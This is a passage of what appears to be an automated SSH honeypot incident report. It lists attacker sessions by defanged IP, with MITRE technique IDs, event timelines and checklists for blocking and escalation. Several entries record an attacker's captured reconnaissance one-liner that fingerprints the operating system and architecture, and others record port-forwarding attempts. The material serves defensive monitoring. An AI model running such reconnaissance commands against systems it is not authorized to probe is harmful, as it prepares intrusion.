| `2026-07-09 13:22:38` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c179fd3435a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:23 |
| **Last Seen** | 2026-07-09 13:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:23:51` | `cowrie.session.connect` |
| `2026-07-09 13:23:52` | `cowrie.client.version` |
| `2026-07-09 13:23:52` | `cowrie.client.kex` |
| `2026-07-09 13:23:53` | `cowrie.login.success` |
| `2026-07-09 13:23:55` | `cowrie.session.params` |
| `2026-07-09 13:23:55` | `cowrie.command.input` |
| `2026-07-09 13:23:55` | `cowrie.command.input` |
| `2026-07-09 13:23:55` | `cowrie.command.input` |
| `2026-07-09 13:23:55` | `cowrie.command.input` |
| `2026-07-09 13:23:55` | `cowrie.command.input` |
| `2026-07-09 13:23:55` | `cowrie.command.success` |
| `2026-07-09 13:23:55` | `cowrie.command.input` |
| `2026-07-09 13:23:55` | `cowrie.command.input` |
| `2026-07-09 13:23:55` | `cowrie.command.input` |
| `2026-07-09 13:23:55` | `cowrie.command.input` |
| `2026-07-09 13:23:55` | `cowrie.log.closed` |
| `2026-07-09 13:23:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f2d3d863e58

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 13:23 |
| **Last Seen** | 2026-07-09 13:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:23:56` | `cowrie.session.connect` |
| `2026-07-09 13:23:56` | `cowrie.client.version` |
| `2026-07-09 13:23:56` | `cowrie.client.kex` |
| `2026-07-09 13:23:57` | `cowrie.login.success` |
| `2026-07-09 13:23:57` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:23:57` | `cowrie.direct-tcpip.data` |
| `2026-07-09 13:23:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c191f78d00b

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 13:24 |
| **Last Seen** | 2026-07-09 13:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:24:19` | `cowrie.session.connect` |
| `2026-07-09 13:24:20` | `cowrie.client.version` |
| `2026-07-09 13:24:20` | `cowrie.client.kex` |
| `2026-07-09 13:24:25` | `cowrie.login.success` |
| `2026-07-09 13:24:29` | `cowrie.session.params` |
| `2026-07-09 13:24:29` | `cowrie.command.input` |
| `2026-07-09 13:24:30` | `cowrie.log.closed` |
| `2026-07-09 13:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c5ea33a836b

| Field | Detail |
|---|---|
| **Source IP** | `110.164.201[.]73` |
| **First Seen** | 2026-07-09 13:25 |
| **Last Seen** | 2026-07-09 13:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:25:29` | `cowrie.session.connect` |
| `2026-07-09 13:25:29` | `cowrie.client.version` |
| `2026-07-09 13:25:29` | `cowrie.client.kex` |
| `2026-07-09 13:25:31` | `cowrie.login.success` |
| `2026-07-09 13:25:32` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.164.201[.]73` to AbuseIPDB if not already reported
- [ ] Block `110.164.201[.]73` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79bcd615b67d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:26 |
| **Last Seen** | 2026-07-09 13:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:26:03` | `cowrie.session.connect` |
| `2026-07-09 13:26:03` | `cowrie.client.version` |
| `2026-07-09 13:26:03` | `cowrie.client.kex` |
| `2026-07-09 13:26:05` | `cowrie.login.success` |
| `2026-07-09 13:26:07` | `cowrie.session.params` |
| `2026-07-09 13:26:07` | `cowrie.command.input` |
| `2026-07-09 13:26:07` | `cowrie.command.input` |
| `2026-07-09 13:26:07` | `cowrie.command.input` |
| `2026-07-09 13:26:07` | `cowrie.command.input` |
| `2026-07-09 13:26:07` | `cowrie.command.input` |
| `2026-07-09 13:26:07` | `cowrie.command.success` |
| `2026-07-09 13:26:07` | `cowrie.command.input` |
| `2026-07-09 13:26:07` | `cowrie.command.input` |
| `2026-07-09 13:26:07` | `cowrie.command.input` |
| `2026-07-09 13:26:07` | `cowrie.command.input` |
| `2026-07-09 13:26:07` | `cowrie.log.closed` |
| `2026-07-09 13:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1d12f589657

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-09 13:26 |
| **Last Seen** | 2026-07-09 13:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:26:12` | `cowrie.session.connect` |
| `2026-07-09 13:26:12` | `cowrie.client.version` |
| `2026-07-09 13:26:12` | `cowrie.client.kex` |
| `2026-07-09 13:26:12` | `cowrie.login.success` |
| `2026-07-09 13:26:12` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:26:13` | `cowrie.direct-tcpip.ja4` |
| `2026-07-09 13:26:13` | `cowrie.direct-tcpip.data` |
| `2026-07-09 13:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d5d84f9f376

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:28 |
| **Last Seen** | 2026-07-09 13:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:28:16` | `cowrie.session.connect` |
| `2026-07-09 13:28:16` | `cowrie.client.version` |
| `2026-07-09 13:28:16` | `cowrie.client.kex` |
| `2026-07-09 13:28:17` | `cowrie.login.success` |
| `2026-07-09 13:28:19` | `cowrie.session.params` |
| `2026-07-09 13:28:19` | `cowrie.command.input` |
| `2026-07-09 13:28:19` | `cowrie.command.input` |
| `2026-07-09 13:28:19` | `cowrie.command.input` |
| `2026-07-09 13:28:19` | `cowrie.command.input` |
| `2026-07-09 13:28:19` | `cowrie.command.input` |
| `2026-07-09 13:28:19` | `cowrie.command.success` |
| `2026-07-09 13:28:19` | `cowrie.command.input` |
| `2026-07-09 13:28:19` | `cowrie.command.input` |
| `2026-07-09 13:28:19` | `cowrie.command.input` |
| `2026-07-09 13:28:19` | `cowrie.command.input` |
| `2026-07-09 13:28:19` | `cowrie.log.closed` |
| `2026-07-09 13:28:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95e79e7e52e9

| Field | Detail |
|---|---|
| **Source IP** | `206.0.8[.]204` |
| **First Seen** | 2026-07-09 13:29 |
| **Last Seen** | 2026-07-09 13:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:29:07` | `cowrie.session.connect` |
| `2026-07-09 13:29:08` | `cowrie.client.version` |
| `2026-07-09 13:29:08` | `cowrie.client.kex` |
| `2026-07-09 13:29:10` | `cowrie.login.success` |
| `2026-07-09 13:29:11` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.0.8[.]204` to AbuseIPDB if not already reported
- [ ] Block `206.0.8[.]204` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-321bc64b9bc7

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-07-09 13:29 |
| **Last Seen** | 2026-07-09 13:30 |
| **Session Duration** | 89s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:29:21` | `cowrie.session.connect` |
| `2026-07-09 13:29:22` | `cowrie.client.version` |
| `2026-07-09 13:29:22` | `cowrie.client.kex` |
| `2026-07-09 13:29:26` | `cowrie.login.success` |
| `2026-07-09 13:29:27` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-408b5130323d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:30 |
| **Last Seen** | 2026-07-09 13:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:30:28` | `cowrie.session.connect` |
| `2026-07-09 13:30:28` | `cowrie.client.version` |
| `2026-07-09 13:30:28` | `cowrie.client.kex` |
| `2026-07-09 13:30:30` | `cowrie.login.success` |
| `2026-07-09 13:30:32` | `cowrie.session.params` |
| `2026-07-09 13:30:32` | `cowrie.command.input` |
| `2026-07-09 13:30:32` | `cowrie.command.input` |
| `2026-07-09 13:30:32` | `cowrie.command.input` |
| `2026-07-09 13:30:32` | `cowrie.command.input` |
| `2026-07-09 13:30:32` | `cowrie.command.input` |
| `2026-07-09 13:30:32` | `cowrie.command.success` |
| `2026-07-09 13:30:32` | `cowrie.command.input` |
| `2026-07-09 13:30:32` | `cowrie.command.input` |
| `2026-07-09 13:30:32` | `cowrie.command.input` |
| `2026-07-09 13:30:32` | `cowrie.command.input` |
| `2026-07-09 13:30:32` | `cowrie.log.closed` |
| `2026-07-09 13:30:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37233d0e41a1

| Field | Detail |
|---|---|
| **Source IP** | `203.193.137[.]250` |
| **First Seen** | 2026-07-09 13:30 |
| **Last Seen** | 2026-07-09 13:30 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:30:41` | `cowrie.session.connect` |
| `2026-07-09 13:30:44` | `cowrie.client.version` |
| `2026-07-09 13:30:44` | `cowrie.client.kex` |
| `2026-07-09 13:30:50` | `cowrie.login.success` |
| `2026-07-09 13:30:53` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:30:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.193.137[.]250` to AbuseIPDB if not already reported
- [ ] Block `203.193.137[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0faad26802

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:32 |
| **Last Seen** | 2026-07-09 13:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:32:34` | `cowrie.session.connect` |
| `2026-07-09 13:32:35` | `cowrie.client.version` |
| `2026-07-09 13:32:35` | `cowrie.client.kex` |
| `2026-07-09 13:32:36` | `cowrie.login.success` |
| `2026-07-09 13:32:38` | `cowrie.session.params` |
| `2026-07-09 13:32:38` | `cowrie.command.input` |
| `2026-07-09 13:32:38` | `cowrie.command.input` |
| `2026-07-09 13:32:38` | `cowrie.command.input` |
| `2026-07-09 13:32:38` | `cowrie.command.input` |
| `2026-07-09 13:32:38` | `cowrie.command.input` |
| `2026-07-09 13:32:38` | `cowrie.command.success` |
| `2026-07-09 13:32:38` | `cowrie.command.input` |
| `2026-07-09 13:32:38` | `cowrie.command.input` |
| `2026-07-09 13:32:38` | `cowrie.command.input` |
| `2026-07-09 13:32:38` | `cowrie.command.input` |
| `2026-07-09 13:32:38` | `cowrie.log.closed` |
| `2026-07-09 13:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39f4ed618e5b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-09 13:34 |
| **Last Seen** | 2026-07-09 13:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:34:21` | `cowrie.session.connect` |
| `2026-07-09 13:34:21` | `cowrie.client.version` |
| `2026-07-09 13:34:21` | `cowrie.client.kex` |
| `2026-07-09 13:34:21` | `cowrie.login.success` |
| `2026-07-09 13:34:21` | `cowrie.direct-tcpip.request` |
| `2026-07-09 13:34:21` | `cowrie.direct-tcpip.data` |
| `2026-07-09 13:34:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ac983269d7d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:34 |
| **Last Seen** | 2026-07-09 13:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:34:44` | `cowrie.session.connect` |
| `2026-07-09 13:34:44` | `cowrie.client.version` |
| `2026-07-09 13:34:44` | `cowrie.client.kex` |
| `2026-07-09 13:34:46` | `cowrie.login.success` |
| `2026-07-09 13:34:47` | `cowrie.session.params` |
| `2026-07-09 13:34:47` | `cowrie.command.input` |
| `2026-07-09 13:34:47` | `cowrie.command.input` |
| `2026-07-09 13:34:47` | `cowrie.command.input` |
| `2026-07-09 13:34:47` | `cowrie.command.input` |
| `2026-07-09 13:34:47` | `cowrie.command.input` |
| `2026-07-09 13:34:47` | `cowrie.command.success` |
| `2026-07-09 13:34:47` | `cowrie.command.input` |
| `2026-07-09 13:34:47` | `cowrie.command.input` |
| `2026-07-09 13:34:47` | `cowrie.command.input` |
| `2026-07-09 13:34:47` | `cowrie.command.input` |
| `2026-07-09 13:34:48` | `cowrie.log.closed` |
| `2026-07-09 13:34:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48e33cc9f577

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-09 13:35 |
| **Last Seen** | 2026-07-09 13:35 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:35:07` | `cowrie.session.connect` |
| `2026-07-09 13:35:08` | `cowrie.client.version` |
| `2026-07-09 13:35:08` | `cowrie.client.kex` |
| `2026-07-09 13:35:14` | `cowrie.login.success` |
| `2026-07-09 13:35:18` | `cowrie.session.params` |
| `2026-07-09 13:35:18` | `cowrie.command.input` |
| `2026-07-09 13:35:20` | `cowrie.log.closed` |
| `2026-07-09 13:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-920ce10aa8e5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:36 |
| **Last Seen** | 2026-07-09 13:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:36:49` | `cowrie.session.connect` |
| `2026-07-09 13:36:49` | `cowrie.client.version` |
| `2026-07-09 13:36:49` | `cowrie.client.kex` |
| `2026-07-09 13:36:51` | `cowrie.login.success` |
| `2026-07-09 13:36:52` | `cowrie.session.params` |
| `2026-07-09 13:36:52` | `cowrie.command.input` |
| `2026-07-09 13:36:52` | `cowrie.command.input` |
| `2026-07-09 13:36:52` | `cowrie.command.input` |
| `2026-07-09 13:36:52` | `cowrie.command.input` |
| `2026-07-09 13:36:52` | `cowrie.command.input` |
| `2026-07-09 13:36:52` | `cowrie.command.success` |
| `2026-07-09 13:36:52` | `cowrie.command.input` |
| `2026-07-09 13:36:52` | `cowrie.command.input` |
| `2026-07-09 13:36:52` | `cowrie.command.input` |
| `2026-07-09 13:36:52` | `cowrie.command.input` |
| `2026-07-09 13:36:53` | `cowrie.log.closed` |
| `2026-07-09 13:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b36783f37f6e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-09 13:38 |
| **Last Seen** | 2026-07-09 13:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 13:38:52` | `cowrie.session.connect` |
| `2026-07-09 13:38:52` | `cowrie.client.version` |
